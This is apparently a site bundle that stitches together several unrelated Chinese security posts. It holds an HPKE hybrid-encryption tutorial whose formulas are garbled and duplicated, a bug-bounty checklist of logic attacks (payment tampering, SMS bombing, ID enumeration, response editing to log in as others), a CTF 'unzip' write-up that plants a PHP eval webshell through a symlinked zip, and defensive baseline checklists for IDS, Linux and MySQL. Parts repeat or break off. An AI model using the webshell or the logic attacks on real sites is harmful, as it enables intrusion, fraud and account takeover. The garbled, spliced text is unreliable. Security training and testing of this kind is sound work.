对于对称密钥加密，有两种主要方法：具有 GCM 模式的 AES 和 ChaCha20/Poly1305：

- AES_GCM_128.
	- 它使用具有计数器模式 （GCM） 的 128 位 AES。这是一种经过验证的 AES 快速加密模式，可将分组密码转换为流密码。
- AES_GCM_256.
	- 它使用具有伽罗瓦/计数器模式 （GCM） 的 256 位 AES。
- chaChaPoly.
	- 它使用带有 Poly1305 MAC（消息验证码）的 ChaCha20 流密码。

## 混合加密

许多其他图书馆已开始采用 HPKE，包括 CIRCL 图书馆：

[https://asecuritysite.com/golang/go_hybrid](https://asecuritysite.com/golang/go_hybrid)

通过ECC（椭圆曲线加密），我们有机会同时使用公钥加密的强大功能，以及对称密钥加密的速度和安全性。因此，我们慢慢转向加密的最佳实践，其中围绕以下方面有越来越多的共识：

- 公钥加密曲线：P256、P384、P521、X25519和X448。
- 密钥派生 （HKDF） 的哈希方法：SHA256、SHA384 和 SHA512。
- 对称密钥：128 位 AES GCM 和 256 位 AES GCM。

上述所有方法都与大多数系统兼容。
为此，Bob 和 Alice 将选择一条曲线来定义他们的密钥对，然后使用给定的哈希方法来派生加密密钥。这通常是通过HKDF（HMAC密钥派生函数）实现的。对于实际加密，我们可以使用对称密钥加密，因为这是最有效的，并且比公钥加密快得多。总体而言，有了这个，总体上倾向于使用AEAD（具有附加数据的身份验证加密）。典型的模式是 GCM。因此，让我们使用 Golang 构建一种混合加密方法。

现在，假设 Bob 将向 Alice 发送加密消息。然后，Alice 将生成一个密钥对（公钥和私钥）。然后，她将公钥发送给 Bob，然后他使用它来派生加密（$S$）的对称密钥。然后，他使用 $K$ 和 AES GCM 对消息进行加密。Bob 接收到密码（$C$）和值 $R$。然后，她可以从 $R$ 中派生出私钥 $S$。使用此密钥，她可以解密密文以派生明文消息。

在这种方法中，Alice 生成一个随机私钥（$d_A$），然后在椭圆曲线（$G$）上取一个点，然后确定她的公钥（$Q_A$）：

$QA=dA×GQ_A = d_A \\times GQA​=dA​×G$

因此，$G$ 和 $Q_A$ 是椭圆曲线上的点。然后，Alice 将 $Q_A$ 发送给 Bob。接下来，Bob 将生成：

$R=r×GR = r \\times GR=r×G S=r×QAS = r \\times Q_AS=r×QA​$

其中 $r$ 是 Bob 生成的随机数。然后，对称密钥（$S$）用于加密消息。

然后，Alice 将与 $R$ 一起接收加密消息。然后，她能够通过以下命令确定相同的加密密钥：

$S=dA×RS = d_A \\times RS=dA​×R$

即：
$S=dA×(r×G)S$ 
$= d_A \\times (r \\times G)S$
$=dA​×(r×G) S$
$=r×(dA×G)S$ 
$= r \\times (d_A \\times G)S$
$=r×(dA​×G) S$
$=r×QAS$ 
$= r \\times Q_AS$
$=r×QA​$
![](https://cdn-images-1.readmedium.com/v2/resize:fit:800/0*so8g9sAGdwSJStUV.png)

## 示例代码
示例运行是 [[here](https://asecuritysite.com/golang/go_hybrid)[：

\`\`\`
Public key type: HPKE_KEM_P256_HKDF_SHA256
 Params kem_id: 16 kdf_id: 1 aead_id: 1
Key exchange parameters:
 Ciphersize:  65
 EncapsulationSeedSize: 32
 PrivateKeySize: 32
 PublicKeySize:  65
 SeedSize:  32
 SharedKeySize:  32
Cipher parameters:
 Key Length: 16
Key derivation function:
 Extract size: 32
Message: Testing 123
Cipher: 74268e3f6f7bc6b21c5071c1a78c8154c6cf1be7f2b93370445026
Decipher: Testing 123
\`\`\`

代码基于 [[here](https://github.com/cloudflare/circl)]：

\`\`\`go
package main
import (
 "crypto/rand"
// "encoding/hex"
 "fmt"
 "os"
 "strconv"
 "github.com/cloudflare/circl/hpke"
)
func main() {
 kemID := int(hpke.KEM_P256_HKDF_SHA256)
 kdfID := int(hpke.KDF_HKDF_SHA256)
 aeadID := int(hpke.AEAD_AES128GCM)
 msg := "Hello"
 argCount := len(os.Args[1:])
 if argCount > 0 {
  msg = os.Args[1]
 }
 if argCount > 1 {
  kemID, _ = strconv.Atoi(os.Args[2])
 }
 if argCount > 2 {
  kdfID, _ = strconv.Atoi(os.Args[3])
 }
 if argCount > 3 {
  aeadID, _ = strconv.Atoi(os.Args[4])
 }
 suite := hpke.NewSuite(hpke.KEM(kemID), hpke.KDF(kdfID), hpke.AEAD(aeadID))
 info := []byte("Test")
 Bob_pub, Bob_private, _ := hpke.KEM(kemID).Scheme().GenerateKeyPair()
 Bob, _ := suite.NewReceiver(Bob_private, info)
 Alice, _ := suite.NewSender(Bob_pub, info)
 enc, sealer, _ := Alice.Setup(rand.Reader)
 Alice_msg := []byte(msg)
 aad := []byte("Additional data")
 ct, _ := sealer.Seal(Alice_msg, aad)
 opener, _ := Bob.Setup(enc)
 Bob_msg, _ := opener.Open(ct, aad)
 if (kemID!=48) {fmt.Printf("Public key type:\\t%s\\n", Bob_pub.Scheme().Name()) }
 fmt.Printf(" Params\\t%s\\n", suite.String())
 fmt.Printf("\\nKey exchange parameters:\\n")
 fmt.Printf(" Ciphersize:\\t\\t%d\\n", hpke.KEM(kemID).Scheme().CiphertextSize())
 fmt.Printf(" EncapsulationSeedSize:\\t%d\\n", hpke.KEM(kemID).Scheme().EncapsulationSeedSize())
 fmt.Printf(" PrivateKeySize:\\t%d\\n", hpke.KEM(kemID).Scheme().PrivateKeySize())
 fmt.Printf(" PublicKeySize:\\t\\t%d\\n", hpke.KEM(kemID).Scheme().PublicKeySize())
 fmt.Printf(" SeedSize:\\t\\t%d\\n", hpke.KEM(kemID).Scheme().SeedSize())
 fmt.Printf(" SharedKeySize:\\t\\t%d\\n", hpke.KEM(kemID).Scheme().SharedKeySize())
 fmt.Printf("\\nCipher parameters:\\n")
 fmt.Printf(" Key Length:\\t%d\\n", hpke.AEAD(aeadID).KeySize())
 fmt.Printf("\\nKey derivation function:\\n")
 fmt.Printf(" Extract size:\\t%d\\n", hpke.KDF(kdfID).ExtractSize())

 fmt.Printf("\\nMessage:\\t%s\\n", Alice_msg)
 // fmt.Printf("Cipher:\\t%x\\n", hex.EncodeToString(ct))
 fmt.Printf("Cipher:\\t%x\\n", ct)
 fmt.Printf("Decipher:\\t%s\\n", Bob_msg)
}
\`\`\`

# 结论

虽然 OpenSSL 提供了如此多的加密方法，但它可能会使应用程序容易受到使用传统方法的攻击。除此之外，RSA加密等方法对电池的影响很大。MD5 和 SHA-1 等传统哈希方法也会使应用程序受到攻击。因此，RFC 9180 提供了一种使用最佳安全性的方法，以及有效的方法。所以，去混合动力吧！

`,he=`---
title: Code_dev
tags: [WebSec,BugBounty]
categories: [BugBounty]
---





1 、身份认证安全
1.1、暴力破解
在没有验证码限制或者一次验证码可以多次使用的地方，使用已知用户对密码进行暴力破解或者用一个通用密码对用户进行暴力破解。简单的验证码爆破。

1.2、session & cookie类
会话固定攻击:利用服务器的session不变机制，借他人之手获得认证和授权，冒充他人。

Cookie仿冒:修改cookie中的某个参数可以登录其他用户。

1.3、弱加密
未使用https，是功能测试点，不好利用。

前端加密，用密文去后台校验，并利用smart decode可解

2、业务一致性安全
2.1、手机号篡改
抓包修改手机号码参数为其他号码尝试，例如在办理查询页面，输入自己的号码然后抓包，修改手机号码参数为其他人号码，查看是否能查询其他人的业务。

2.2、邮箱或者用户篡改
抓包修改用户或者邮箱参数为其他用户或者邮箱

2.3、订单id篡改
查看自己的订单id，然后修改id(加减一)查看是否能查看其他订单信息。

2.4、商品编号篡改
例如积分兑换处，100个积分只能换商品编号为001,1000个积分只能换商品编号005,在100积分换商品的时候抓包把换商品的编号修改为005，用低积分换取高积分商品

2.5、用户id篡改
抓包查看自己的用户id，然后修改id(加减1)查看是否能查看其他用户id信息。

3、业务数据篡改
3.1、金额数据篡改
抓包修改金额等字段，例如在支付页面抓取请求中商品的金额字段，修改成任意数据的金额并提交，查看能否以修改后的金额数据完成业务流程。

3.2、商品数量篡改
抓包修改商品数量等子段，将请求中的商品数量修改成任意数额，如负数并提交，查看能否以修改后的数量完成业务流程。

3.3、最大数限制突破
很多商品限制用户购买数量时，服务器仅在页面通过js脚本限制，未在服务器端校验用户提交的数量，通过抓包修改商品最大数限制，将请求中的商品数量改为大于最大数限制的值，查看能否以修改后的数量完成业务流程。

3.4、本地js参数修改
部分应用程序通过Javascript处理用户提交的请求，通过修改Javascript脚本，测试修改后的数据是否影响到用户。

4、密码找回漏洞
密码找回逻辑测试一般流程

i.首先尝试正常密码找回流程，选择不同找回方式，记录所有数据包

ii.分析数据包，找到敏感部分

iii.分析后台找回机制所采用的验证手段

iv.修改数据包验证推测



5、验证码突破
验证码不单单在登录、找密码应用，提交敏感数据的地方也有类似应用，故单独分类，并进一步详情说明。

5.1、验证码暴力破解测试
使用burp对特定的验证码进行暴力破解

5.2、验证码时间、次数测试
抓取携带验证码的数据包不断重复提交，例如:在投诉建议处输入要投诉的内容信息，及验证码参数，此时抓包重复提交数据包，查看历史投诉中是否存在重复提交的参数信息。

5.3、验证码客户端回显测试
当客户端有需要和服务器进行交互，发送验证码时，即可使用firefox按F12调出firebuf就可看到客户端与服务器进行交互的详细信息

5.4、验证码绕过测试
当第一步向第二步跳转时，抓取数包，对验证码进行篡改清空测试，验证该步骤验证码是否可以绕过。

5.5、验证码js绕过
短信验证码验证程序逻辑存在缺陷，业务流程的第一步、第二步，第三步都是放在同一个页面里，验证第一步验证码是通过js来判断的，可以修改验证码在没有获取验证码的情况下可以填写实名信息，并且提交成功。

6、业务授权安全
6.1、未授权访问
非授权访问是指用户在没有通过认证授权的情况下能够直接访问需要通过认证才能访问到的页面或文本信息。可以尝试在登录某网站前台或后台之后，将相关的页面链接复制于其他浏览器或其他电脑上进行访问，看是否能访问成功。

6.2、越权访问
水平越权

即用户A和用户B属于同一个权限组，水平越权就是用户A可以看到用户B才可以看到的一些内容。一个简单的例子，就是保单管理系统中，每个人都只可以看到自己的保单，如果出现用户A可以查看到用户B的保单的现象，此时就发生了水平越权。

垂直越权

即用户A和用户B属于不同的权限组，如用户A属于普通用户权限组，而用户B属于管理员权限组，垂直越权就是用户A可以看到用户B才可以看到的内容。一个简单的例子，用户A可以看到通讯录界面，用户B可以看到通讯录和用户管理的界面（其中用户管理界面可以看到用户密码）。如果用户A修改一下请求的URL即可以看到作为管理员才可已看到的全部用户密码，此时就发生了垂直越权。

检测思路

出现越权访问漏洞的主要原因，是因为开发人员只是在前端界面进行了简单的菜单隐藏，而没有用统一的服务端拦截器/中间件对于全部URL请求进行权限判断。这样，攻击者只需要在浏览器或者BurpSuite之类的攻击工具中，发出对于指定URL的请求，即可以实现对于特定接口的越权访问。

如果将用户A与他所属的权限组/不同权限组用户群体的惯常访问URL合集进行比对，可以发现有些URL是多个用户都会访问的，而有的URL（或者请求中含有的特定的参数）是各个用户访问时都存在差异的。这类具有差异性的URL即为敏感URL。

当用户A访问了不在惯常访问URL合集内的URL，且此URL为敏感URL，即可以判定为发生了越权访问。

7、业务流程乱序
7.1、顺序执行缺陷
a) 部分网站逻辑可能是先A过程后B过程然后C过程最后D过程

b) 用户控制着他们给应用程序发送的每一个请求，因此能够按照任何顺序进行访问。于是，用户就从B直接进入了D过程，就绕过了C。如果C是支付过程，那么用户就绕过了支付过程而买到了一件商品。如果C是验证过程，就会绕过验证直接进入网站程序了。

8、业务接口调用安全
8.1、重放攻击
在短信、邮件调用业务或生成业务数据环节中(类:短信验证码，邮件验证码，订单生成，评论提交等),对其业务环节进行调用(重放)测试。如果业务经过调用(重放)后被多次生成有效的业务或数据结果。

a) 恶意注册

b) 短信

在测试的过程中，我们发现众多的金融交易平台仅在前端通过JS校验时间来控制短信发送按钮，但后台并未对发送做任何限制，导致可通过重放包的方式大量发送恶意短信

8.2、内容编辑
点击"获取短信验证码",并抓取数据包内容。通过分析数据包，可以发现参数sendData/insrotext的内容有客户端控制，可以修改为攻击者想要发送的内容

9、时效绕过测试
大多有利用的案例发生在验证码以及业务数据的时效范围上，在之前的总结也有人将12306的作为典型，故，单独分类。

9.1、时间刷新缺陷
12306网站的买票业务是每隔5s，票会刷新一次。但是这个时间确实在本地设置的间隔。于是，在控制台就可以将这个时间的关联变量重新设置成1s或者更小，这样刷新的时间就会大幅度缩短(主要更改autoSearchTime本地参数)。

9.2、时间范围测试
针对某些带有时间限制的业务，修改其时间限制范围，例如在某项时间限制范围内查询的业务，修改含有时间明文字段的请求并提交，查看能否绕过时间限制完成业务流程。例如通过更改查询手机网厅的受理记录的month范围，可以突破默认只能查询六个月的记录。

新设置成1s或者更小，这样刷新的时间就会大幅度缩短(主要更改autoSearchTime本地参数)。

9.2、时间范围测试
针对某些带有时间限制的业务，修改其时间限制范围，例如在某项时间限制范围内查询的业务，修改含有时间明文字段的请求并提交，查看能否绕过时间限制完成业务流程。例如通过更改查询手机网厅的受理记录的month范围，可以突破默认只能查询六个月的记录。
### SRC中的逻辑漏洞总结

1. 注册：
    1. 短信轰炸
    2. 验证码安全问题
    3. 密码爆破
    4. 邮箱轰炸
2. 用户任意注册、批量注册
3. 用户名枚举
4. XSS（有框的地方就可以尝试插XSS）
5. 登录：
    1. 短信轰炸、验证码安全问题、密码爆破、邮箱轰炸
    2. SQL注入
    3. 撞库
    4. 抓包把password字段修改为空值发送
    5. 认证凭证替换、比如返回的数据包中包含账号，修改账号就能登录到其他账号
    6. Cookie仿冒
    7. 修改返回包的相关数据，可能会登陆到其他的用户
6. 找回密码：
    1. 短信邮箱轰炸、短信邮箱劫持
    2. 重置任意用户账户密码、验证码手机用户未统一验证
    3. 直接跳过验证步骤
7. 购买支付、充值（要利用抓包去仔细查看每一个可用的参数）
    1. 交易金额、数量修改、更换支付模块（比如更换支付的模块金额）
    2. 交易信息订单编码/导致信息泄露
    3. 整数溢出，int最大值为2147483647，超过最大值
    4. 修改充值账户
    5. 支付绕过
8. 抽奖活动
    1. 刷奖品、积分
    2. 并发
9. 优惠卷、代金卷
    1. 并发逻辑漏洞（burp批量获取优惠券）
    2. 修改优惠券金额、数量
10. 订单信息
    1. 订单信息遍历、泄露
    2. 订单信息泄露导致用户信息泄露
    3. 删出他人订单
11. 会员系统
    1. 修改个人信息上传文件，上传带弹窗的html
    2. 如遇上上传xlsx、docx，可能存在XXE，上传恶意的文档盲测
    3. 图片上传也可能遇到imagereagick命令执行，上传恶意图片
    4. 视频上传如果使用ffmpeg<3.2.4（视频按帧分割成图片），上传恶意avi盲测ssrf
    5. 用户横向越权访问、遍历、导致用户信息泄露
    6. SQL注入、个人简历处存储XSS个人信息注册的名称也可以插入XSS

1. 传输过程
    1. 明文传输账户密码
    2. 修改信息处无session/token导致csrf
    3. POST/COOKIE注入

1. 评论
    1. POST注入
    2. 存储型XSS
    3. 无session/token导致CSRF

  

1. 验证码问题
    1. 万能验证码
    2. 返回包中存在验证码
    3. 删除验证码或者cookie中的值可以爆破账号密码
2. 短信轰炸
    1. 一直重放
    2. 删除修改cookie，重放数据包
    3. 遍历参数发送数据包
    4. 手机号后面加空格或者前面加其他的比如+86或者逗号分号等，然后重发数据包
    5. 请求参数修改大小写，或者添加请求参数比如&id=1
    6. 一个站的登录处可能做了防护，但是再找回密码处可能没有安全防护，或者在注册流程中没有安全防护，所以说多测试接口
    7. 如果对手机号一天的次数进行了限制，还可以再发一次短信，DO intercept之后修改为成功回显

1. 水平越权
    1. 主要登陆后还是修改参数，主要找到多个接口不断测试
    2. 关注网页源代码，有时候会有表单，但被bidden（隐藏标签）给隐藏起来了，可以修改返回包然后尝试获取数据检测
    3. 多个账号，主要分析请求参数
2. 数据泄露
    1. 再找回密码处，填写数据后抓包查看返回信息，有可能存在敏感数据返回
3. 任意用户密码重置
    1. 目前大部分都是在修改密码处参数修改
    2. 有些是前端验证

支付逻辑漏洞

1. 边界值问题 : 正常的逻辑是用户购买商品，然后价格累加得到一个总价进行扣款。这个时候就会产生逻辑问题：如果说用户购买的商品是负数了，那么计算的总数就是负数。反过来钱给用户
2. 顺序执行缺陷：正常的逻辑是a-b-c-d 循环渐进的进行流程操作。这个时候就会产生逻辑问题：可以直接从中绕过某一个过程进入到下一步操作。如果说有一项是支付的操作，那么也就会产生支付绕过，如果说有一项是验证机制，就会绕过验证直接进入下一步。
3. 金额直接传输导致篡改：直接对下单的金额进行修改值，这里可以使用fd或者burp抓包
4. 确定支付之后还可以加入购物车：把商品放入购物车点击下单支付，会跳转到微信，支付宝等第三方支付平台。这个时候还可以继续在购物车中加入商品，支付结束之后，商家发放的商品是现在的购物车里面的东西。
5. 请求重放：购买成功之后，继续重放请求，可以让购买的商品一直增加。购买成功之后，会有一个银行对商户网站跳转的过程，如果反复进行操作，有几率会导致商品反复购买和增加，但是不需要付更多的钱。
6. 请求参数干扰：金钱做了签名认证之后，修改后不通过，但是在里面仍然会有一个参数对金额产生影响导致问题产生。
7. 订单替换：订单替换发生在支付之后的事件处理，同时向服务器发起二次支付请求一个多一个少，支付金额少的，然后支付之后进行替换，告知服务器订单支付完成，并且过程可以反复的回放。
8. 欺诈:需要两个收款人，一个是正常的商家，一个是伪造的商家
9. 单位替换：产生在paypal类似的国际支付的场景。
10. 用户替换：在支付过程中发生用户替换现象，首先登陆自己的账户，然后取得另外一个人的账户名等有效信息，在业务流程中用对方的用户名替换自己的用户名，用对方的余额购买完成后，再替换自己的账户名，这样就形成别人的钱买自己的东西
11. 强制攻击：强制攻击发生在暴力破解的情况下，如果一个商家运用一个自己的网店，接入第三方支付接口，由于设计上的不当导致商家与第三方支付约定的密钥Key可以单独被MD5加密，导致可以使用MD5碰撞技术对密钥进行破解，攻击者可以设计简单的密钥加密信息使得MD5加密是可以用MD5碰撞技术进行暴力破解。
12. 秘钥泄漏：内置支付功能的app为了设计上的方便有可能会把Md5或者是RSA的私钥泄漏导致攻击者反编译apk之后获取密钥信息使得交易信息可以被篡改。
13. 函数修改：apk反编译之后的函数修改，可能导致商家在最后一步向支付方提交订单时未验证信息的准确性，仍然被篡改。
14. heart bleed：SSL（安全套接层）协议是使用最为普遍网站加密技术，而OpenSSL则是开源的 SSL 套件，为全球成千上万的web服务器所使用。Web服务器正是通过它来将密钥发送给访客然后在双方的连接之间对信息进行加密。URL中使用 https打头的连接都采用了SSL加密技术。在线购物、网银等活动均采用SSL技术来防止窃密及避免中间人攻击。

该漏洞被归为缓冲过度读取。缓冲过度读取错误是软件可以读取比应该被允许还多的数据。漏洞让特定版本的openSSL成为无需钥匙即可开启的“废锁”，入侵者每次可以翻检户主的64K信息，只要有足够的耐心和时间，就可以翻检足够多的数据，拼凑出户主的银行密码、私信等敏感数据。产生原因：数据在传输的两端是不加密的。一些数据如果在传输过程中不加密则会泄露个人数据等信息。

1. 修改返回包的越权
    1. 修改手机号

一般的逻辑为：认证原手机号-> 填写新手机号-> 提交修改

如果在下一步操作时，没有校验上一步的认证是否成功时，就会存在逻辑缺陷绕过

比如在进行第一步认证原手机号时，随意输入验证码，将response包中的相关字段进行修改，比如0改成1，false改成true，即可绕过第一步验证，进入填写新手机号界面，如果第三步提交修改时没有验证第一步的结果，就会造成逻辑漏洞

1. 登录绕过

部分网站的身份验证放在了前端，因此只需要将response包中的相关字段进行修改，比如0改成1，false改成true，就可以登录任意用户账号

1. 水平越权
    1. 遍历ID

在一些请求中，GET和POST中有明显的ID数字参数（手机号、员工号、账单号、银行卡号、订单号等等），可以尝试进行遍历，如果程序没有对当前权限进行判断，就会存在水平越权问题

1. ID替换

如果程序对用户标识进行了hash或者加密，而无法破解用的什么方式的话，就无法通过遍历ID来获取其它用户的信息了，此时可以尝试注册两个账号，通过替换两个ID加密后的值，判断程序是否对权限进行了验证，如果没有，也会存在越权问题

1. 垂直越权

观察cookie中的session字段，可能某些字段或者参数代表身份，尝试修改`,ge=`---
title: CISCN Web unzip writeup 
tags: [Linux,WebSec,CTF]
categories: [CTF]
---

## CISCN Web unzip writeup


### 0x01 题目描述

\`\`\`php
 <?php
error_reporting(0);
highlight_file(__FILE__);

$finfo = finfo_open(FILEINFO_MIME_TYPE);
if (finfo_file($finfo, $_FILES["file"]["tmp_name"]) === 'application/zip'){
    exec('cd /tmp && unzip -o ' . $_FILES["file"]["tmp_name"]);
};

//only this! 
\`\`\`

\`ln -s var/www/html link\`

\`zip --symlinks link.zip link\`

删除文件link


新建目录link
\`mkdir link\`

\`cd link\`

\`cat shell.php\`

<?php eval($_REQUEST[1]);phpinfo();?>

\`cd ..\`

\`zip -r demo.zip link/\`



`,ue=`---
title: 基线检查表 
tags: [基线检查,IDS, 安全审计, 网络设备防护]
categories: [基线检查]
---


# IDS检查表


|分类|测评项|预期结果|评估操作示例|检查情况|结果|整改建议|
|---|---|---|---|---|---|---|
|安全审计|应对网络系统中的网络设备运行状况、网络流量、用户行为等进行日志记录|日志文件包含设备运行状况、网络流量、用户行为|登录到 IDS 中，找到日志管理，任意查询日志，查看日志详情|||日志需记录设备运行状况、网络流量、用户行为等，管理员可自行配置调整|
|安全审计|审计记录应包括：事件的日期和时间、用户、事件类型、事件是否成功及其他与审计相关的信息|操作日志中应包括上述几种类型|登录到 IDS 中，找到操作日志，查看操作日志详情|||根据不同的 IDS 类型，对操作日志的记录详情进行调整|
|安全审计|应能够根据记录数据进行分析，并生成审计报表|IDS 应该能够根据记录数据进行分析，生成审计报表|||||
|网络设备防护|应对登录网络设备的用户进行身份鉴别|每个账户都有对应的口令，不存在空口令和弱口令|用不同的账户和口令登录到系统中|||每个用户都要设置口令，不能存在空口令|
|网络设备防护|应对网络设备的管理员登录地址进行限制|只有固定的 IP 地址才能以管理员的权限登录到系统中|登录到系统中>系统管理>管理员>管理员设置中有允许登录 IP|||登录到系统中>系统管理>管理员>管理员设置中将允许登录 IP 设置为固定的 IP 地址|
|网络设备防护|主要网络设备应对同一用户选择两种或两种以上组合的鉴别技术来进行身份鉴别|采用了两种及两种以上组合鉴别技术进行身份鉴别|在登录过程中可以知道|||根据实际需求，建议尽量都选用两种或两种以上的组合鉴别技术进行身份鉴别|
|网络设备防护|身份鉴别信息应具有不易被冒用的特点，口令应有复杂度要求并定期更换|口令长度至少为 10 位，包含数字，字母（大小写），特殊字符三种形式，更换周期为 90 天|登录到系统中>系统管理>管理员>登录参数设置|||建议整改为口令长度至少为 10 位，包含数字，字母（大小写），特殊字符三种形式，更换周期为 90 天|
|网络设备防护|应具有登录失败处理功能，可采取结束会话、限制非法登录次数和当网络登录连接超时自动退出等措施|限制非法登录次数为 5 次，登录超时退出时间为 300 秒|登录到系统中>系统管理>管理员>登录参数设置|||建议设置为限制非法登录次数为 5 次，登录超时退出时间为 300 秒，避免非法登录的风险|
|网络设备防护|当对网络设备进行远程管理时，应采取必要措施防止鉴别信息在网络传输过程中被窃听|应采用 SSL 加密方式对传输数据进行加密|使用 https + IP 登录到管理后台，能成功登录就是采用了 SSL|||登录到系统中>系统管理>管理员>web 访问协议设置中选择启用 https|


# Linux基线检查表

|分类|测评项|预期结果|评估操作示例|检查情况|结果|整改建议|
|---|---|---|---|---|---|---|
|身份鉴别|应对登录操作系统和数据库系统的用户进行身份标识和鉴别|1) 操作系统使用口令鉴别机制对用户进行身份标识和鉴别；<br>2) 登录时提示输入用户名和口令；以错误口令或空口令登录时提示登录失败，验证了登录控制功能的有效性；<br>3) 操作系统不存在密码为空的用户。|cat /etc/passwd，cat /etc/shadow 查看文件中各用户名状态|||操作系统和数据库每个用户都必须设置登录用户名和登录密码，不能存在空密码|
|身份鉴别|操作系统和数据库系统管理用户身份标识应具有不易被冒用的特点，口令应有复杂度要求并定期更换|密码策略如下：<br>PASS_MAX_DAYS   90（生命期最大为 90 天）<br>PASS_MIN_DAYS   0（密码最短周期 0 天）<br>PASS_MIN_LEN   10（密码最小长度 10 位）<br>PASS_WARN_AGE 7（密码到期前 7 天提醒）<br>口令复杂度：<br>口令长度 8 位以上，并包含数字、字母、特殊字符三种形式|more /etc/login.defs |||密码最大生存周期为 90 天|
|身份鉴别|||密码最短修改周期为 0 天，可以随时修改密码||
|身份鉴别|||密码最小长度为 10 位，包含数字，特殊字符，字母（大小写）三种形式||
|身份鉴别|||密码到期前 7 天必须提醒||
|身份鉴别|应启用登录失败处理功能，可采取结束会话、限制非法登录次数和自动退出等措施|1) 操作系统已启用登陆失败处理、结束会话、限制非法登录次数等措施；<br>2) 当超过系统规定的非法登陆次数或时间登录操作系统时，系统锁定或自动断开连接|cat /etc/pam.d/system-auth，查看相应的登录设置|||建议限制，密码过期后重设的密码不能和前三次的密码相同|
|身份鉴别|当对服务器进行远程管理时，应采取必要措施，防止鉴别信息在网络传输过程中被窃听|1) 操作系统使用 SSH 协议进行远程连接；<br>2) 若未使用 SSH 方式进行远程管理，则查看是否使用 telnet 方式进行远程管理；|查看是否运行 SSH：<br>cat service -status-all | grep sshd;<br>查看是否使用 telnet 方式：cat service -status -all | grep running；|||系统远程登录时要采取 SSH 方式登录或采用密文传输信息，保障信息的安全性|
|身份鉴别|为操作系统和数据库的不同用户分配不同的用户名，确保用户名具有唯一性|用户的标识唯一，若系统允许用户名相同，UID 不同，则 UID 是唯一性标识；若系统允许 UID 相同，则用户名是唯一性标识。|cat /etc/passwd 文件中的用户名信息，每个信息用“：”分隔开来，每个字段对应的信息为：<br>注册名：口令（密文用 x 来代替）：UID：GID：用户名：用户主目录：命令解释程序 Shell|||UID 是唯一性标识，每个用户必须采用不同的 UID 来区分|
|身份鉴别|应采用两种或两种以上组合的鉴别技术对管理用户进行身份鉴别|对管理员访谈，对于三级系统，必须使用两种或两种以上组合的鉴别技术实现用户身份鉴别，如密码和口令的组合使用。|访谈管理员|||三级系统建议采用用户名密码 + 证书口令登录的方式；<br>三级以下系统可以采用一种鉴别技术。|
|访问控制|应启用访问控制功能，依据安全策略控制用户对资源的访问|root 用户：<br>passwd 文件夹只有 rw - r - r 权限<br>shadow 文件夹只有 r - - - 权限<br>r = 4 w = 2 x = 1|在 root 权限下：ls - l /etc/passwd<br>ls - l /etc/shadow<br>查看用户权限。<br>- rw - r--r--：第一个 rw 表示文件所有者有读写权限；<br>第二个 r 表示与文件所有者同一组的用户只有读的权限；<br>第三个 r 表示不与文件所有者同一组的用户只有读的权限|||根据实际需求，对每个用户的访问权限进行限制，对敏感的文件夹限制访问用户的权限|
|访问控制|应根据管理用户的角色分配权限，实现管理用户的权限分离，仅授予管理用户所需的最小权限；|访谈管理员，了解每个用户的作用、权限|||给予账户所需最小权限，避免出现特权用户|
|访问控制|应实现操作系统和数据库系统特权用户的权限分离|操作系统和数据库的特权用户的权限必须分离，避免一些特权用户拥有过大的权限，减少人为误操作|访谈管理员|||分离数据库和操作系统的特权用户，不能使一个用户权限过大|
|访问控制|应严格限制默认帐户的访问权限，重命名系统默认帐户，修改这些帐户的默认口令|默认账户已更名，或已被禁用|cat /etc/passwd|||严格限制默认账户的访问权限，对存在的默认账户的用户名和口令进行修改。<br>使用 usermod - L 用户名，来锁定默认用户。|
|访问控制|应及时删除多余的、过期的帐户，避免共享帐户的存在|不存在多余、过期和共享账户|cat /etc/passwd|||删除、禁用例如 uucp，ftp 等多余账户|
|安全审计|审计范围应覆盖到服务器和重要客户端上的每个操作系统用户和数据库用户|系统开启了安全审计功能或部署了第三方安全审计设备|service auditd status|||开启系统本身的安全审计功能，完整记录用户对操作系统和文件访问情况，或采用第三方的安全审计设备|
|安全审计|审计内容应包括重要用户行为、系统资源的异常使用和重要系统命令的使用等系统内重要的安全相关事件|审计功能已开启，包括：用户的添加和删除、审计功能的启动和关闭、审计策略的调整、权限变更、系统资源的异常使用、重要的系统操作（如用户登录、退出）等设置|ps - ef | grep auditd|||开启审计功能，记录用户的添加和删除、审计功能的启动和关闭、审计策略的调整、权限变更、系统资源的异常使用、重要的系统操作（如用户登录、退出）等操作|
|安全审计|审计记录应包括事件的日期、时间、类型、主体标识、客体标识和结果等|审计记录包括事件的日期、时间、类型、主体标识、客体标识和结果等内容|cat /etc/audit/auditd.conf<br>cat /etc/audit/audit.rules|||记录事件产生的时间，日期，类型，主客体标识等|
|安全审计|操作系统应遵循最小安装的原则，仅安装需要的组件和应用程序，并通过设置升级服务器等方式保持系统补丁及时得到更新|1) 系统安装的组件和应用程序遵循了最小安装的原则；<br>2) 不必要的服务没有启动；<br>3) 不必要的端口没有打开；|service --status-all | grep running|||在不影响系统的正常使用的前提下，对系统的一些端口和服务可以进行关闭，避免这些端口或服务的问题导致系统问题|
|资源控制|应通过设定终端接入方式、网络地址范围等条件限制终端登录|已设定终端登录安全策略及措施，非授权终端无法登录管理|/etc/hosts.deny、/etc/hosts.allow 中对终端登录限制的相关配置参数|||建议配置固定的终端、特定的网络范围内才能进行终端登录|
|资源控制|应根据安全策略设置登录终端的操作超时锁定|已在/etc/profile 中为 TMOUT 设置了合理的操作超时时间|cat /etc/profile|||超时时间建议设置为 300 秒|


# MySQL 完整检查表

## 一、身份鉴别
### （一）默认账号要求
- 预期结果：不存在默认数据库和默认帐号；不存在匿名账户；应用系统应使用新建用户，不得使用系统默认账户。
- 评估操作示例：
    - mysql> show databases;
    - mysql> select * from user;
    - 只保留单个管理员 root 和应用系统专用账户。
- 检查情况：
- 结果：
- 整改建议：在不影响系统正常运行的情况下删除默认账号，若默认账号下有系统运行，则修改默认账号名。

### （二）数据库系统管理用户账号名和密码要求项
- 预期结果：修改 root 用户默认口令，删除空口令；改变默认 mysql 管理员帐号，host 为空。
- 评估操作示例：mysql> select * from user;查看列表中 root 用户口令不为空，host 为空。
- 检查情况：
- 结果：
- 整改建议：修改 root 用户的默认密码，不能有空口令，MySQL 默认的账户为 root，需要新建一个账户。MySQL 账户的 Host=%应该为空，这样来禁止远程连接。

### （三）管理员口令策略
- 预期结果：至少 8 位，数字、字母（大小写）、特殊字符组成的不规律密码。
- 评估操作示例：mysql>select password from user;查看密码。
- 检查情况：
- 结果：
- 整改建议：密码修改为 8 位以上，包含数字，字母（大小写），特殊字符三种形式。

### （四）账号权限策略
